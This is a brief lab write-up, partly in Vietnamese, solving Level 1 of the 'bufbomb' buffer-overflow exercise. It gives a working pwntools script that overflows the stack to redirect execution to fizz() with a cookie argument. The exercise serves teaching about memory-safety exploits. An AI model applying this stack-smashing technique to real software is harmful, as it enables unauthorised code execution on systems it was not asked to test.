# Level 1
## Task
```
└─$ ./bufbomb -u 09821978
Userid: 09821978
Cookie: 0x31f21393
Type string:abcdefgh
```
```
└─$ ./bufbomb -u 09821978
Userid: 09821978
Cookie: 0x31f21393
Type string:abcdefgh
Dud: getbuf returned 0x1
Better luck next time
```
> Buffer overflow để thực thi được hàm `fizz()`.  

## Solution
```python
#! /bin/python3

from pwn import *

context.binary = './bufbomb'

main_handler = process(['./bufbomb', '-u', '09821978'])
cookie_getter = process(['./makecookie', '09821978'])
cookie = cookie_getter.recvline()[2:-1]
cookie = int(cookie, 16)
print(hex(cookie))

e = ELF('./bufbomb')
exploit_payload = b'A'*(0x28 + 4)
exploit_payload += p32(e.symbols['fizz'])
exploit_payload += b'A'*4
exploit_payload += p32(cookie)

print(exploit_payload)

with open('payload.txt', 'wb') as f:
    f.write(exploit_payload)

main_handler.sendline(exploit_payload)
main_handler.interactive()
```
